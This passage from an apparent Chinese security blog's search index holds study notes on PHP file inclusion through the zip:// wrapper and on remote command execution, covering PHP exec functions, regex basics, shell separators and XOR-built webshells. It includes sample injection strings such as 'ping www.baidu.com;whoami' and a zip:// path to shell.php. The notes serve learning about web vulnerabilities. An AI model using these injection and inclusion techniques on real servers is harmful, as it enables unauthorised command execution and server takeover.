</p></blockquote><p>以上来自PHP手册。</p><p>zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;类似，但是用法不同。</p><p>使用格式：</p><p>?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] </p><p>eg:<strong>zip:&#x2F;&#x2F;xxx.png#shell.php</strong></p><p>使用条件：</p><p>条件： PHP &gt; &#x3D;5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p><p>也就是在url中，要对#进行编码。</p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程代码执行</title>
      <link href="/2022/06/15/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE)/"/>
      <url>/2022/06/15/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE)/</url>
      
        <content type="html"><![CDATA[<h1 id="远程代码执行漏洞（RCE"><a href="#远程代码执行漏洞（RCE" class="headerlink" title="远程代码执行漏洞（RCE)"></a>远程代码执行漏洞（RCE)</h1><p><strong>RCE英文全称：remote command&#x2F;code execute（远程命令&#x2F;代码执行漏洞）</strong></p><p>分为远程命令执行ping和远程代码执行evel。</p><p>漏洞成因：命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。</p><p>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p><p><strong>这里涉及到一个概念：ping</strong></p><p>Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP&#x2F;IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220329113042498.png" alt="image-20220329113042498"></p><p>对于ping指令的一些补充：</p><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><p>这个其实也可以类比为eval($_POST[‘’])；这种情况，当不控制转入的参数的时候，就会被控制。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>继承Web服务程序的权限去执行系统命令或读写文件<br> 反弹shell<br> 控制整个网站甚至控制服务器<br> 进一步内网渗透</p><h1 id="PHP涉及函数"><a href="#PHP涉及函数" class="headerlink" title="PHP涉及函数"></a>PHP涉及函数</h1><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset()函数：用于检测变量是否已设置并且非 NULL。</span><br><span class="line">highlight_file()函数：对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</span><br><span class="line">show_source()是 highlight_file() 的别名。</span><br><span class="line">eval()函数:用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">next() 将内部指针指向数组中的下一个元素</span><br><span class="line">glob() 函数返回匹配指定模式的文件名或目录</span><br><span class="line">array_reverse()：将数组逆序排列</span><br><span class="line">array_rand(): 随机返回数组的键名</span><br><span class="line">array_flip()：交换数组的键和值</span><br><span class="line">session_start(): 告诉PHP使用session;</span><br><span class="line">session_id(): 获取到当前的session_id值；</span><br><span class="line">rev():将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。</span><br></pre></td></tr></table></figure><h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat函数 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac函数 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br></pre></td></tr></table></figure><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system() 输出并返回最后一行shell结果。</span><br><span class="line">exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line">passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）</span><br></pre></td></tr></table></figure><h2 id="获取文件内容函数"><a href="#获取文件内容函数" class="headerlink" title="获取文件内容函数"></a>获取文件内容函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pos()是current()的别名</span><br><span class="line">pos():返回数组中当前元素的值</span><br><span class="line">scandir()：函数返回一个数组，其中包含指定路径中的文件和目录(获取目录下的文件)</span><br><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br></pre></td></tr></table></figure><h1 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h1><h3 id="元字符："><a href="#元字符：" class="headerlink" title="元字符："></a>元字符：</h3><p>1、**+**，+ 号代表前面的字符必须至少出现一次（1次或多次）。</p><p>2、*****，* 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。</p><p>3、<strong>？</strong>，? 问号代表前面的字符最多只可以出现一次（0次或1次）。</p><p><strong>其中<code>+</code> <code>*</code>具有贪婪性，这两个元字符会尽可能多的匹配字符。如果希望实现最小匹配、或是非贪婪，可以使用？来限制。</strong></p><h3 id="普通字符："><a href="#普通字符：" class="headerlink" title="普通字符："></a>普通字符：</h3><p>普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</p><p><code>[ABC]  匹配括号中的所有字符。</code></p><p><code>[^ABC]  匹配除了中括号中的所有字符</code></p><p><code>[A-Z]  表示一个区间，其中匹配所有的大写字母（当然，也可以[A-z]匹配所有的大小写）</code></p><p><code>.  匹配除了换行符之外的任何单个字符</code></p><p><code>[\s\S]  匹配所有，\s是匹配所有空白符，包括换行符，\S是匹配所有非空白符，不包括换行。</code></p><p><code>\w  匹配字母、数字、下划线</code></p><h3 id="非打印字符："><a href="#非打印字符：" class="headerlink" title="非打印字符："></a>非打印字符：</h3><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220329123107547.png" alt="image-20220329123107547"></p><h3 id="特殊字符："><a href="#特殊字符：" class="headerlink" title="特殊字符："></a>特殊字符：</h3><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\ 放在它们前面。下表列出了正则表达式中的特殊字符：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330191040233.png" alt="image-20220330191040233"></p><h3 id="限定符："><a href="#限定符：" class="headerlink" title="限定符："></a>限定符：</h3><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。</p><p>正则表达式的限定符有：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330191139231.png" alt="image-20220330191139231"></p><h3 id="定位符："><a href="#定位符：" class="headerlink" title="定位符："></a>定位符：</h3><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。</p><p>定位符用来描述字符串或单词的边界，^ 和 $ 分别指字符串的开始与结束，\b 描述单词的前或后边界，\B 表示非单词边界。</p><p>正则表达式的定位符有：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330200551984.png" alt="image-20220330200551984"></p><p>不能将限定符和定位符一起使用，因为在紧靠换行或者单词边界的前面或者后面不能有一个以上的位置（？）</p><p>所以不能使用<code>^*</code>这种形式的表达式。</p><p>如果要匹配一行文本开始的地方的文本，要在正则表达式的开始使用^字符。</p><p><strong>单词边界是单词和空格之间的位置。非单词边界是任何其他位置。</strong></p><p>\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。</p><p>字符串 apt 出现在单词 Chapter 中的非单词边界处，但出现在单词 aptitude 中的单词边界处。对于 \B 非单词边界运算符，不可以匹配单词的开头或结尾。</p><p>这两个东西比较重要的作用就是可以标识想要匹配的字符串到底是在一个单词的开头还是中间，或是结尾。通过对部分字符串的位置进行标识，可以做到对匹配进行过滤。</p><p>eg:</p><p>可以只匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt。</p><h3 id="反向引用："><a href="#反向引用：" class="headerlink" title="反向引用："></a>反向引用：</h3><p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</p><p>缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 \n 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><p>可以使用非捕获元字符<code> ?:</code>、<code>?= </code>或 <code>?!</code> 来重写捕获，忽略对相关匹配的保存。 </p><p>基本应该就是引用其中一段的匹配式。</p><h3 id="修饰符："><a href="#修饰符：" class="headerlink" title="修饰符："></a>修饰符：</h3><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p><p>标记不写在正则表达式里，标记位于表达式之外，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/pattern/flags</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330211825418.png" alt="image-20220330211825418"></p><h3 id="元字符：-1"><a href="#元字符：-1" class="headerlink" title="元字符："></a>元字符：</h3><p><a href="https://www.runoob.com/regexp/regexp-metachar.html">https://www.runoob.com/regexp/regexp-metachar.html</a></p><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>在Linux中，通配符?表示匹配单个字符。</p><p>这个就和之前表示的不一样了，需要特别看一下。</p><blockquote><p>\i 与大小写都进行匹配<br> \w 与任意单词字符匹配，任意单词字符表示 [A-Z]、 [a-z]、[0-9]、_<br> \d 与任意数字匹配</p></blockquote><p>上面这部分可以直接看元字符</p><h2 id="Windows环境下的管道符："><a href="#Windows环境下的管道符：" class="headerlink" title="Windows环境下的管道符："></a>Windows环境下的管道符：</h2><p>1、<code>|</code>，表示直接执行后面的语句。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330213250836.png" alt="image-20220330213250836"></p><p>直接执行了后面的whoami语句。</p><p>2、<code>||</code>，如果前面执行的语句出错（包括但不限于命令语句出错或者是后面的语句部分出错），就执行后面的语句。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330213427396.png" alt="image-20220330213427396"></p><p>3、<code>&amp;</code>，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235516607.png" alt="image-20220401235516607"></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235642058.png" alt="image-20220401235642058"></p><p>4、<code>&amp;&amp;</code>，如果前面的语句为真，则先执行第一个命令，后执行第二个命令。如果为假，就两个都不执行。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235819393.png" alt="image-20220401235819393"></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235925143.png" alt="image-20220401235925143"></p><h2 id="Linux环境下的管道符："><a href="#Linux环境下的管道符：" class="headerlink" title="Linux环境下的管道符："></a>Linux环境下的管道符：</h2><p>1、<code>;</code>当执行完了前面的命令之后，就执行后面的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com;whoami</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/1600512054_5f65e0364695687b45fad.png!small" alt="1600512054_5f65e0364695687b45fad.png!small"></p><p>2、<code>|</code>，只显示后面语句的执行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com|whoami</span><br></pre></td></tr></table></figure><p>3、<code>||</code>，当前面的语句执行错误的时候，会执行后面的语句。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/1600512086_5f65e056a06ea92ce6174.png!small" alt="1600512086_5f65e056a06ea92ce6174.png!small"></p><p>4、<code>&amp;</code>，如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假</p><h2 id="无数字字母构造webshell："><a href="#无数字字母构造webshell：" class="headerlink" title="无数字字母构造webshell："></a>无数字字母构造webshell：</h2><p>当对输入进行了过滤之后，可以通过运算和拼接的方式来得到需要的字母或是数字。</p><p>常见的运算方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、异或运算</span><br><span class="line">2、按位与运算</span><br><span class="line">3、按位或运算</span><br></pre></td></tr></table></figure><p>例如在PHP中，当将两个变量的值进行异或的时候，会首先将两个变量的值转换为ascii，然后再将ascii进行二进制转换，之后再将两个变量进行异或，后将异或结果转换为ascii，将ascii转换为字符串。。</p><p>（这种PHP中的绕过方式其实是很常见的。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两个变量-&gt;转换为ascii-&gt;转换为二进制-&gt;进行异或-&gt;异或二进制转换为ascii-&gt;转换为字符串。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
